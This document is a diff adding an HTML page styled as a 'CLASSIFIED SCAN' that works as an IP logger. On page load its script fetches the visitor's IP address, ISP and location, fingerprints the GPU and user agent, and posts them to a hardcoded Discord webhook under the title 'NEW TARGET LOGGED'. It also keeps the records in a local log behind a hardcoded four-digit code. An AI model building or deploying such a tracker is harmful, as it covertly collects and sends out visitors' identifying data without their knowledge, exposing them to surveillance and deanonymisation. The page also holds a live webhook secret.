@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CLASSIFIED | Sync Active</title>
+    <style>
+        body { 
+            background: #000 url('https://i.redd.it/jxrd0n9xcgxa1.png') no-repeat center fixed;
+            background-size: cover; color: #ff0000; font-family: 'Consolas', monospace; 
+            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh;
+        }
+        .container, .admin-panel {
+            background: rgba(0, 0, 0, 0.95); border: 2px solid #ff0000;
+            padding: 20px; width: 90%; max-width: 500px; box-shadow: 0 0 30px #ff0000; text-align: center;
+        }
+        .admin-panel { display: none; border-color: #00ffff; box-shadow: 0 0 30px #00ffff; }
+        .data-line { font-size: 0.85em; margin: 5px 0; border-bottom: 1px solid #330000; display: flex; justify-content: space-between; }
+        .value { color: #fff; }
+        input { background: #000; border: 1px solid #ff0000; color: #fff; padding: 10px; width: 80%; margin: 10px 0; }
+        button { background: #ff0000; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="visitor-ui" class="container">
+    <h1>CLASSIFIED SCAN</h1>
+    <div style="color: #ff0000; font-size: 0.7em; margin-bottom: 20px;">SYSTEM STATUS: ANALYZING CONNECTION...</div>
+    <div id="scan-results">
+        <div class="data-line"><span>IP Address:</span> <span class="value" id="ip">...</span></div>
+        <div class="data-line"><span>ISP:</span> <span class="value" id="isp">...</span></div>
+        <div class="data-line"><span>Location:</span> <span class="value" id="location">...</span></div>
+    </div>
+    <div onclick="showLogin()" style="margin-top: 40px; font-size: 0.6em; color: #333; cursor: pointer;">SIGNAL STABLE... READY FOR UPLOAD</div>
+</div>
+
+<div id="login-ui" class="container" style="display:none;">
+    <h1 style="color:#00ffff;">ENCRYPTED ACCESS</h1>
+    <input type="password" id="admin-code" placeholder="ENTER 4-DIGIT CODE">
+    <button onclick="checkCode()" style="background:#00ffff;">VIEW LOCAL LOGS</button>
+</div>
+
+<div id="admin-ui" class="admin-panel">
+    <h1 style="color:#00ffff;">LOCAL DATABASE</h1>
+    <div id="db-content" style="height: 250px; overflow-y: scroll; text-align: left; font-size: 0.7em;"></div>
+    <button onclick="location.reload()" style="margin-top:10px;">LOGOUT</button>
+</div>
+
+<script>
+    const HOOK = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";
+    const ACCESS_CODE = "4592";
+
+    // 1. Fetch data and send to Discord
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const info = {
+                ip: data.ip,
+                isp: data.org,
+                loc: `${data.city}, ${data.region}, ${data.country_name}`,
+                gpu: getGPU(),
+                ua: navigator.userAgent
+            };
+
+            document.getElementById('ip').innerText = info.ip;
+            document.getElementById('isp').innerText = info.isp;
+            document.getElementById('location').innerText = info.loc;
+
+            sendToDiscord(info);
+            saveLocal(info);
+        });
+
+    function sendToDiscord(info) {
+        const payload = {
+            embeds: [{
+                title: "⚠️ NEW TARGET LOGGED",
+                color: 16711680,
+                fields: [
+                    { name: "IP Address", value: info.ip, inline: true },
+                    { name: "ISP", value: info.isp, inline: true },
+                    { name: "Location", value: info.loc },
+                    { name: "GPU Info", value: info.gpu },
+                    { name: "Device Info", value: info.ua }
+                ],
+                footer: { text: "CLASSIFIED v17 | " + new Date().toLocaleString() }
+            }]
+        };
+        fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    }
+
+    function saveLocal(info) {
+        let logs = JSON.parse(localStorage.getItem('cl_db') || "[]");
+        logs.push({ ...info, time: new Date().toLocaleString() });
+        localStorage.setItem('cl_db', JSON.stringify(logs));
+    }
+
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { return "Unknown"; }
+    }
+
+    function showLogin() { document.getElementById('visitor-ui').style.display='none'; document.getElementById('login-ui').style.display='block'; }
+    function checkCode() {
+        if(document.getElementById('admin-code').value === ACCESS_CODE) {
+            document.getElementById('login-ui').style.display='none';
+            document.getElementById('admin-ui').style.display='block';
+            const logs = JSON.parse(localStorage.getItem('cl_db') || "[]");
+            document.getElementById('db-content').innerHTML = logs.reverse().map(l => `<div>[${l.time}] ${l.ip} - ${l.loc}</div>`).join('');
+        }
+    }
+</script>
+</body>
+</html>
